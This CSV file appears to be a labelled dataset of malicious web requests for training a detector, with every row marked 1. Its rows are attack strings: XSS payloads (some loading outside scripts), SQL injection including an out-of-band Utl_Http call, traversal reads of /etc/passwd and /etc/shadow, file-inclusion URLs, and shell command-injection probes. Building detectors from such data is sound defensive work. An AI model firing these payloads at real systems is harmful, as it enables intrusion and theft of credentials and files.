code,status
%27,1
/examples/jsp/sessions/lang/index.php?file=/etc/passwd,1
"/o6ebbirj.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/verify.asp?username=',1
"|echo$IFSGCRAHC$((53+91))$(echo$IFSGCRAHC)GCRAHC
||echo$IFSCCZBZV$((42+82))$(echo$IFSCCZBZV)CCZBZV",1
"/top.php?stuff=""&ver >q85227619&rem ",1
/scripts/xuicksry9grj.cfm,1
"/main.php?stuff=""\x0auname\x09>q48139983\x09#",1
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",1
"/d44uk9h2.cfc?<script>document.cookie=""testmybc=2088;""</script>",1
/do_inscript1/,1
; str=$(echo YTYKPD); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,1
"/azcrfs8d.mscgi?<meta http-equiv=set-cookie content=""testjpdr=9205"">",1
/scripts/search.cgi?..\..\..\..\..\..\winnt\win.ini,1
/scripts/gm.cgi,1
/javascript/whosonline.exe,1
"/cacti/mmstdod.cgi?alternate_templates=| echo ""content-type: text/html"";echo """" ; id\x00",1
"&&echo DNDLZD$((92+6))$(echo DNDLZD)DNDLZD""",1
"/169okeyj.htm?<script>document.cookie=""testxeoi=3573;""</script>",1
"/1qwv2p5p.cgi?<script>document.cookie=""testvqcy=252;""</script>",1
"/azcrfs8d.php3?<meta http-equiv=set-cookie content=""testjpdr=9205"">",1
',1
"/editprojectissue.do?projectissueid=""><script>alert(414225590327)</script><""",1
'|echo JZJOSI$((32+42))$(echo JZJOSI)JZJOSI,1
/en-us/account/af.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd,1
/help/index.php?show=XXpathXX,1
"/phpmyadmin/login.php?course=""><script>alert(atutor_xss.nasl)</script>",1
"|echo$IFSMNCLPS$((56+63))$(echo$IFSMNCLPS)MNCLPS""",1
"/tukodz3j.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/colors/sgdynamo.exe?htname=sgdynamo.exe,1
"<a href=""&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38&#35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#49&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49&#38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#38&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49"">Clickhere</a>",1
 echo IJYFHL$((62+88))$(echo IJYFHL)IJYFHL',1
%22| [ 4 -ne $(echo DAZTLG | tr -d '\n' | wc -c) ] || sleep 1 %7C,1
/scripts/includes/main.conf,1
/mailpasswd/,1
/inc/service.alert.inc.php?SPL_CFG[dirroot]=XXpathXX?,1
/examples/jsp/colors/sql.php?lib_inc=1&btndrop=no&goto=/etc/passwd,1
'+if(benchmark(3000000,1
/scripts/index.cfm?catid=1 sql,1
/igtf0zon.cgi?<script>cross_site_scripting.nasl</script>,1
/cacti/index.php?configfile=../../../../../../../../../etc/passwd,1
"/q703m78q.jsp?<script>document.cookie=""testvowq=604;""</script>",1
/javascript/lock.exe,1
| [ 7 -ne $(echo JJZSID | tr -d '\n' | wc -c) ] || sleep 1 \\,1
/scripts/news.scr.php?GLOBALS[PTH][classes]=XXpathXX?,1
/fcgi-bin/r.cgi?file=../../../../../../../../../../etc/passwd,1
&echo VGMMDM$((58+64))$(echo VGMMDM)VGMMDM,1
 else sleep 1,1
/scripts/index.php?edit=nonexistant846876774,1
 then sleep 0,1
 else sleep 1,1
"/help.php?q="";uname >q49727674 #",1
 str=$(echo FPLFHR),1
/javascript/ignore.exe,1
'& sleep 0 && str=$(echo JICOQS) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 ,1
/javascript/about.exe,1
"<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'""-->",1
 then sleep 0,1
"=3CSCRIPT=3Econfirm(document.location)=3C/SCRIPT=3E""></iframe>",1
/nsn/..\util/glist.bas,1
"<embed src=""data:text/html;base64",1
/mod/texte/index.php?config[pathMod]=XXpathXX,1
/cacti/library/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/scripts/nph-exploitscanget.cgi?host=`id`&port=5488&errchk=0&idsbypass=0,1
/examples/jsp/num/topic.php?tid='select,1
"/examples/jsp/error/search.jsp?q=%""<script>alert(1331904374)</script>",1
"<A HREF=""http://www.google.com"">XSS</A>",1
/main.php?stuff='\x0auname >q75819271 #,1
/scripts/index2.php?_server[]=&_server[remote_addr]='.system('id').exit().'&option=wrapper&module[module]=1,1
 fi %26,1
/lsoix5h3.cgi?<script>cross_site_scripting.nasl</script>,1
"/help.php?q=""&uname\x09#",1
 str1=${#str},1
 else sleep 1,1
-268435455,1
',1
&echo DACXMN$((57+35))$(echo DACXMN)DACXMN',1
/editor&#39;s-blog/,1
"/r3le3om5.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
&#X03C;,1
/examples/jsp/cal/search.cgi?..\..\..\..\..\..\windows\win.ini,1
"/main.php?stuff=""ver\x0c>q95513284&rem\x0c",1
"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=""javas<![CDATA[cript:alert('XSS');"">",1
 fi %22,1
/examples/jsp/checkbox/classes/adodbt/sql.php?classes_dir=/etc/passwd\x00,1
"/index.php?errcode=<script>alert(""413375588092"");</script>",1
'print(`echo TUDOUK;echo $((63+88));echo TUDOUK;echo TUDOUK`);TUDOUK,1
/help.php?q=ver >q45459255&rem ,1
echo$IFSXLQCAL$((78+24))$(echo$IFSXLQCAL)XLQCAL|,1
/scripts/rihzp7swr3p6.shtml,1
 echo EBRLPU$((95+26))$(echo EBRLPU)EBRLPU//,1
 then sleep 0,1
 if [ 1 -ne ${str1} ],1
/russell's_teapot/,1
ORDER BY 21 ,1
 str1=${#str},1
"/scripts/search.jsp?q=%""<script>alert(1332008323)</script>",1
| [ 1 -ne $(echo RBBJAR | tr -d '\n' | wc -c) ] || sleep 1 ,1
 str=$(echo KQSZPY),1
ORDER BY 30 ,1
<anything onmouseover=javascript:confirm(1)>,1
"/33y9gcqq.cfm?<meta http-equiv=set-cookie content=""testnvxc=4301"">",1
/javascript/1990.exe,1
/cacti/docs/index.php?lang=/../../../../../../../../../../etc/passwd\x00,1
/wp-content/plugins/wp-table/js/wptable-button.phpp?wpPATH=XXpathXX?,1
 str1=${#str},1
/archive.php?scriptpath=@rfiurl?scriptpath=@rfiurl?,1
")print(`echo CHKGSS`.`echo $((80+0))`.`echo CHKGSS`.`echo CHKGSS`);#CHKGSS
)print(`echo KZZFJE;echo $((74+13));echo KZZFJE;echo KZZFJE`);%23KZZFJE",1
 then sleep 0,1
/scripts/contrib/forms/evaluation/c_formevaluation.class.php?fileroot=/etc/passwd\x00,1
/0qhcnefz.jspa?<script>cross_site_scripting.nasl</script>,1
 else sleep 1,1
 str=$(echo FYHGFL),1
echo $((57+90)),1
& sleep 0 && str=$(echo ZPLJWX) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 %26,1
'; str=$(echo FBVDTE); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,1
 else sleep 1,1
"/7o5qp766.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
 else sleep 1,1
../,1
 fi \\,1
"/examples/jsp/colors/server.pt?open=space&name="";}</script><script>alert('plumtree_name_xss.nasl')</script>",1
"/help.php?q=""&del\x0cq33739327&rem\x0c",1
"/dslpwt15.php?<script>document.cookie=""testtkio=5454;""</script>",1
"| [ 7 -ne $(echo DLKWGT | tr -d '\n' | wc -c) ] || sleep 1 """,1
/scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1
/examples/jsp/jsp2/el/index2.php?_server[]=&_server[remote_addr]='.system('id').exit().'&option=wrapper&module[module]=1,1
<listing>&ltimg src=x onerror=confirm(1)&gt</listing>,1
"/0w155a7c.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/fmnveedu.x?<meta http-equiv=set-cookie content=""testgfbr=7014"">",1
 then sleep 0,1
/scripts/kfzqb5x87lvq.pl,1
/friend.php?op=sitesent&fname=<script>alert('vulnerable')</script>,1
"/calendar.php?week=""><script>alert(410285570375)</script>",1
%27; str=$(echo AUJGTN); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,1
"/search-results.dot?search_query=nessus""><script>alert('dotcms_search_query_xss.nasl')</script>/",1
/main.php?logout=\x0duname >q49774432 #,1
"/xlj7h65o.exe?<script>document.cookie=""testtbbe=856;""</script>",1
/examples/jsp/checkbox/cgi/tseekdir.cgi?location=/etc/passwd\x00,1
 then sleep 0,1
"/admin/operators.php?projectissueid=""><script>alert(412615577805)</script><""",1
 str1=${#str},1
"/rpxyx07v.htm?<meta http-equiv=set-cookie content=""testbnli=1975"">",1
/.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\..\..\..\{FILE},1
echo $((11+35)),1
";echo YUCTUM$((64+59))$(echo YUCTUM)YUCTUM""",1
 fi %5C%5C,1
/forum_professionnel.asp?n=/....../boot.ini|41|80040e14|[microsoft][odbc_sql_server_driver][sql_server]line_1:_incorrect_syntax_near_&#039;/&#039;.,1
'&echo$IFSZJHAFI$((51+78))$(echo$IFSZJHAFI)ZJHAFI//,1
/opensiteadmin/scripts/classes/formmanager.php?path=http://192.168.202.118:8080/moclyxlwqyfjnp?\x00,1
"/examples/jsp/jsp2/jspx/session/login.php?dest=nessus""><script>alert('ossim_dest_xss.nasl')</script><!-- ",1
/javascript/readme.exe,1
/scripts/shared/help.php?page=../../../../../../../../../../etc/passwd\x00,1
| [ 4 -ne $(echo SKWMFK | tr -d '\n' | wc -c) ] || sleep 1 %26,1
..%bg%qf,1
"/t7tm4m0b.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/servlets/servlet/inc/formmail.inc.php?script_root=../templates/mail.tpl.txt\x00,1
/cacti/includes/db_adodb.php?basedir=/etc/passwd\x00,1
/cgi-bin/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331905098')</script>,1
";echo$IFSSXCKTB$((75+80))$(echo$IFSSXCKTB)SXCKTB\
&echo$IFSWZXINW$((50+11))$(echo$IFSWZXINW)WZXINW\",1
/en-us/fo564rei.do?<script>cross_site_scripting.nasl</script>,1
 str1=${#str},1
/phpmyadmin/index.php?lng=../system_footer&sensor_program=phpsysinfo_241.nasl,1
"/en-us/ddoworrl.html?<script>document.cookie=""testvlau=8517;""</script>",1
| [ 6 -ne $(echo TEUISW | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,1
/examples/jsp/cal/listrec.pl?app=qmh-news&template=;ls /etc|,1
/recordings/search.php?searchstring=<script>foo</script>,1
/examples/jsp/colors/search.php?searchstring=<script>foo</script>,1
"/fpnpp5zg.htm?<script>document.cookie=""testyias=101;""</script>",1
<IFRAME/SRC=DATA:TEXT/HTML;BASE64,1
/environment.php?DIR_PREFIX=XXpathXX,1
/i2n4v4rl.jsp?<script>cross_site_scripting.nasl</script>,1
 then sleep 0,1
">""<>""<script>confirm(1)</script>",1
 str=$(echo NETEBT),1
"<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=""click"";document.getElementById(""safe123"").click=function()+{alert(Safe.get());};document.getElementById(""safe123"").click(test);'><source>#",1
 else sleep 1,1
/scripts/search/show.pl?url=file:/etc/passwd,1
 fi &,1
"/en-us/33y9gcqq.html?<meta http-equiv=set-cookie content=""testnvxc=4301"">",1
\\&apos;/bin/cat /etc/shadow\\&apos;,1
"/top.php?stuff=""rm\x09q67284925&rem\x09",1
'||utl_inaddr.get_host_name((select+user+from+dual)),1
/javascript/support.exe,1
/page.exe,1
/javascript/review.exe,1
/index.php?rep=<script>alert(document.cookie)</script>,1
 str1=${#str},1
; str=$(echo EWYGBO); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi //,1
%27& sleep 0 && str=$(echo KMQXRC) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %27,1
/examples/servlets/servlet/library/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
"/169okeyj.dll?<script>document.cookie=""testxeoi=3573;""</script>",1
%27& sleep 0 && str=$(echo EEDNGD) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 \\,1
',1
 fi %5C%5C,1
"&lt;SCRIPT&gt;document&#46;write(\""&lt;SCRI\"");&lt;/SCRIPT&gt;PT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1
"/miz4r5hz.x?<script>document.cookie=""testviqu=1270;""</script>",1
"/hrttz9fj.cfc?<meta http-equiv=set-cookie content=""testtbjy=7334"">",1
 else sleep 1,1
"/main.php?logout=1 '"" -- ",1
"/o35zot2r.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/606wkcop.cfc?<script>cross_site_scripting.nasl</script>,1
'echo ZQODFO$((38+30))$(echo ZQODFO)ZQODFO&,1
"/admin/login.php?path=\""></form><form name=a><input name=i value=xss>&lt;script>alert('vulnerable')</script>",1
/javascript/monthly.exe,1
/examples/jsp/jsp2/jspx/index.php?action=login&languages[nessus]=syscp_1211.nasl&language=nessus&langs[nessus][0][file]=/etc/passwd,1
/help.php?q=;del q94314237 #,1
 fi %2F%2F,1
/examples/jsp/num/cart32.exe,1
/whois.cgi?action=load&whois=;id,1
"<button onclick=""window.open('http://xss.cx/::Error138 ');"">CLICKME",1
 str1=${#str},1
/javascript/proto.exe,1
"<video src=""x"" onloadstart=""confirm(1)"">",1
"/help.php?q=""&ping;-w;9000;-n;1;1.2.3.4&rem;",1
"/cgi-bin/search.jsp?q=%""<script>alert(1332010391)</script>",1
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",1
/texis.exe/nessus,1
/phpmyadmin/_head.php?_zb_path=../../../../../../../../../../etc/passwd\x00,1
&echo RKCZIL$((79+92))$(echo RKCZIL)RKCZIL\,1
&&echo OUHWFL$((62+61))$(echo OUHWFL)OUHWFL|,1
&echo ZPAVCI$((24+53))$(echo ZPAVCI)ZPAVCI//,1
/qb2xy9aw.idc?<script>cross_site_scripting.nasl</script>,1
"/cacti/wordtrans.php?command=show_desc&advanced=1"";id; true """,1
/chonlpritranscript/,1
/examples/jsp/checkbox/awstatstotals.php?sort={${phpinfo()}}{${exit()}},1
 if [ 9 -ne ${str1} ],1
/scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1332008335,1
/examples/jsp/error/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_jawtayfo]));die;/*,1
echo OJUIJZ$((60+38))$(echo OJUIJZ)OJUIJZ&,1
/biblioteca/lin_save.php?CLASSPATH=XXpathXX,1
"/33y9gcqq.fts?<script>document.cookie=""testnvxc=4301;""</script>",1
${popen(print(`echo ATLEFF;echo $((90+9));echo ATLEFF;echo ATLEFF`);%5C%5CATLEFF,1
"/h4bi26jd.aspx?<meta http-equiv=set-cookie content=""testhrzx=1150"">",1
 str=$(echo IEZSHQ),1
"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",1
"/i7prbs22.asp?<meta http-equiv=set-cookie content=""testjnre=7328"">",1
"/tuwjta1w.kspx?<script>document.cookie=""testpokn=7494;""</script>",1
"/fnwhrxyd.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/colors/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/subscription_info/,1
/javascript/to.exe,1
/cgi/windmail.exe,1
/examples/jsp/error/calendar_admin.pl?config=|cat /etc/passwd|,1
"/33y9gcqq.fts?<meta http-equiv=set-cookie content=""testnvxc=4301"">",1
/PhotoCart/adminprint.php?admin_folder=XXpathXX,1
/..//..//..//..//..//..//..//..//{FILE},1
1;SELECT *,1
"/zln2hm2z.asp?<meta http-equiv=set-cookie content=""testblcp=8120"">",1
/cacti/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=limbo_com_fm_php_shell.nasl-1331905161,1
/0qhcnefz.php3?<script>cross_site_scripting.nasl</script>,1
/en-us/account/pfdispaly.cgi?../../../../../../etc/passwd,1
| [ 1 -ne $(echo OIYJXA | tr -d '\n' | wc -c) ] || sleep 1 &,1
/scripts/index.php?op=default&date=200607' union select 1,1
"<img =""><script>alert(1)</script>"">",1
/header.php?path=XXpathXX,1
/scripts/t769qwej0llr.inc,1
/phpmyadmin/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331923195')</script>,1
/examples/jsp/calfaq.php?skin=../../admin/manager&tplpath=admin,1
323'  AND   (  SELECT    2937   FROM(  SELECT     COUNT(*),1
"/agent_affil.pl?login=<script>alert(""414395594702"");</script>",1
/examples/jsp/jsp2/el/btdownload.php?type=torrent&file=../../../../../../../../../../etc/passwd,1
"/main.php?logout=""ver\xa0>q91628118&rem\xa0",1
/vwmg565s.x?<script>cross_site_scripting.nasl</script>,1
"<img src=x onerror='confirm(domain+/ -- /+cookie)'>"">",1
<!DOCTYPE doc [,1
 else sleep 1,1
/examples/servlets/servlet/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd\x00,1
/scripts/web_store/web_store.cgi?page=../../../../../../etc/passwd\x00.html,1
';echo IETDFJ$((93+90))$(echo IETDFJ)IETDFJ,1
"/top.php?stuff=""&rm\xa0q83547895&rem\xa0",1
"/help.php?q=""del\x0cq49751234&rem\x0c",1
&lt;SCRIPT SRC=//xss.rocks/.j>,1
"' echo VJRMHC$((3+22))$(echo VJRMHC)VJRMHC""",1
"/tuwjta1w.cfm?<meta http-equiv=set-cookie content=""testpokn=7494"">",1
/cgi-bin/..\xc1\x1c..\xc1\x1c..\xc1\x1c..\xc1\x1c..\xc1\x1c../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
"/main.php?logout=""ping;-w;11000;-n;1;4.3.2.1&rem;",1
/ajax/loadsplash.php?full_path=XXpathXX,1
"; str=$(echo TSUCKA); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,1
 str1=${#str},1
%22; str=$(echo BUMBBO); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,1
/help.php?q=&ver >q32627628&rem ,1
/functions/sections.func.php?GLOBALS[PTH][classes]=XXpathXX?,1
/top.php?stuff=uname >q33363697 #,1
/user.php?op=userinfo&uname=<script>alert('hi');</script>,1
/scgi-bin/gwweb.exe?help=bad-request,1
/crystalimagehandler.aspx?dynamicimage=../../../../../../../../winnt/system.ini,1
"/8x6w469u.php?<script>document.cookie=""testgfjr=1286;""</script>",1
'+(SELECT 999999)+',1
/bbedit_script/,1
/core/api.php?t_path_core=/etc/passwd\x00,1
"/m2fpztty.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/index.php?x=browse&category='union select '1',1
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>,1
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",1
/zuihld5m.aspx?<script>cross_site_scripting.nasl</script>,1
/cacti/store.php?crn=42'&action=show&show_products_mode=cat_click,1
/examples/jsp/error/way-board/way-board.cgi?db=/etc/passwd\x00,1
/..\..\..\..\..\..\..\{FILE},1
/main.php?logout=rm;q78779487&rem;,1
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",1
& sleep 0 && str=$(echo GIKITN) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 //,1
 then sleep 0,1
/examples/jsp/jsp2/jspx/sugarcrm/modules/users/login.php?theme=../../../../../../../etc/passwd\x00,1
/cacti/demos/demo.browse.php?filename=/etc/passwd,1
/indexk.php?lib_path=XXpathXX?,1
%27| [ 5 -ne $(echo HYWCTJ | tr -d '\n' | wc -c) ] || sleep 1 //,1
;echo RDEQIN$((60+72))$(echo RDEQIN)RDEQIN//,1
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",1
"/gvx7m5ti.idc?<script>document.cookie=""testwldz=3506;""</script>",1
/phpmyadmin//../../../../../../../../etc/passwd\x00en,1
${exec(print(`echo SRPMSX`.`echo $((59+33))`.`echo SRPMSX`.`echo SRPMSX`))}SRPMSX,1
 or a=a--,1
/examples/servlets/servlet/search=<script>alert('xss')</script>,1
<script> location.href = 'data:text/html;base64,1
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,1
& sleep 0 && str=$(echo ZYXRFF) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 &,1
"/zln2hm2z.cfm?<script>document.cookie=""testblcp=8120;""</script>",1
/scripts/_admin/,1
/script_menu/,1
/arash_lib/class/arash_gadmin.class.php?arashlib_dir=XXpathXX,1
',1
/recordings/lib/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
 str1=${#str},1
| [ 4 -ne $(echo ZDEVVW | tr -d '\n' | wc -c) ] || sleep 1 ',1
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
 then sleep 0,1
"/606wkcop.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"<!--#echo var=""server_name -->",1
|echo$IFSQBNKUQ$((13+79))$(echo$IFSQBNKUQ)QBNKUQ&,1
 str=$(echo OKMZVE),1
/quagynka.htm?<script>cross_site_scripting.nasl</script>,1
"/help.php?q=""ping;-w;11000;-n;1;4.3.2.1&rem;",1
/scripts/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331923189&lang_crm=../../vtigerservice.php\x00,1
 if [ 3 -ne ${str1} ],1
"/xlj7h65o.cfc?<meta http-equiv=set-cookie content=""testtbbe=856"">",1
/3rdparty/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd\x00,1
/7dbjwpw6.jsp?<script>cross_site_scripting.nasl</script>,1
"<div id=""111""><div style=""background:url(/f#[a]oo/;color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div><div id=""112""><div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div>",1
& sleep 0 && str=$(echo SZMRAM) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 \\,1
/subscriptions.lib,1
/inc/download_center_lite.inc.php?script_root=@rfiurl,1
/cgi-perl/ion-p.exe?page=c:\winnt\repair\sam,1
/worldpay_notify.php?mosConfig_absolute_path=XXpathXX,1
/purchaseprintsubscription/,1
/main.php?frm_daynight=day&frm_passwd=&frm_referer=http://192.168.26.202/top.php?stuff=1861731255&frm_user=q26491665&scr_height=&scr_width=,1
/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=XXpathXX,1
/...\...\...\...\...\...\...\...\...\winnt\win.ini,1
 then sleep 0,1
 then sleep 0,1
| [ 6 -ne $(echo HZZOKR | tr -d '\n' | wc -c) ] || sleep 1 &,1
/zqqemp6j.html?<script>cross_site_scripting.nasl</script>,1
&#x003e;,1
/noscriptfailover/,1
' and 0=benchmark(3000000,1
"/main.php?stuff=""ver >q63222197&rem ",1
echo$IFSUOWFKR$((67+63))$(echo$IFSUOWFKR)UOWFKR,1
<option>'><button><img src=x onerror=confirm(0);></button></option>,1
/help.php?q=ping;-w;7000;-n;1;1.2.3.4&rem;,1
'& sleep 0 && str=$(echo DKKEQZ) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 %26,1
/votebox.php?VoteBoxPath=XXpathXX,1
"/en-us/dda2qr7j.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
hi' or 'a'='a,1
/examples/servlets/servlet/index.php?album=../../../../../../../../../../etc/passwd\x00,1
"<isindex action=""javas&Tab;cript:alert(1)"" type=image>",1
or,1
'& sleep 0 && str=$(echo BJMMJX) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 \\,1
/scripts/index.php,1
< s c r i p t > p r o m p t ( 1 ) < / s c r i p t >,1
"<video onerror=""javascript:javascript:alert(1)""><source>",1
/examples/jsp/jsp2/el/showproduct.php?product=1',1
"/top.php?stuff=""\x0ddel q93764844 #",1
"/0w155a7c.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/cgi-bin/pfdispaly.cgi?../../../../../../../../../../etc/passwd,1
/oneadmin/ecommerce/sampleecommerce.php?path[docroot]=XXpathXX?,1
|echo HEMYTZ$((83+92))$(echo HEMYTZ)HEMYTZ//,1
ORDER BY 11 ,1
"<a href=""[a]java[b]script[c]:alert(1)"">XXX</a>",1
/../{FILE},1
 str1=${#str},1
 if [ 5 -ne ${str1} ],1
"/a0imiuf1.php?<script>document.cookie=""testxqrn=4654;""</script>",1
"/en-us/jnv890lt.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/servlets/servlet/js/vendors.php?file=../../../../../../../../../../etc/passwd\x00nessus.js,1
"/q703m78q.aspx?<script>document.cookie=""testvowq=604;""</script>",1
"/l4fz1dqw.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",1
 then sleep 0,1
/help.php?q='&sleep\x098\x09#,1
"/a0imiuf1.pl?<script>document.cookie=""testxqrn=4654;""</script>",1
'|echo$IFSZXEJNO$((10+18))$(echo$IFSZXEJNO)ZXEJNO//,1
 fi &,1
<svg/onload=prompt(1);>,1
<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' + x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted',1
/phpmyadmin/adlayer.php?layerstyle=../../../../../../../etc/passwd\x00,1
"/recordings/user.cgi?url=""><script>alert(""gossamer_links_url_xss.nasl"");</script>&from=add",1
"/en-us/odzk29aa.do?<meta http-equiv=set-cookie content=""testtfvh=2141"">",1
/javascript/purchasing.exe,1
1||Utl_Http.request('http://<yourservername>') from dual--,1
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,1
; str=$(echo DRVINS); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,1
/main.php?g2_itemid=/../../../../../../../../../../../etc/passwd\x00,1
&#x0003C;,1
/kinderstartoct27transcript/,1
 then sleep 0,1
 fi ,1
/cgi-bin/gotopage.cgi?4242+../../../../../../../../../../../../../etc/passwd,1
/postinstallation-script/,1
/javascript/turbine.exe,1
/trial-subscription/,1
 else sleep 1,1
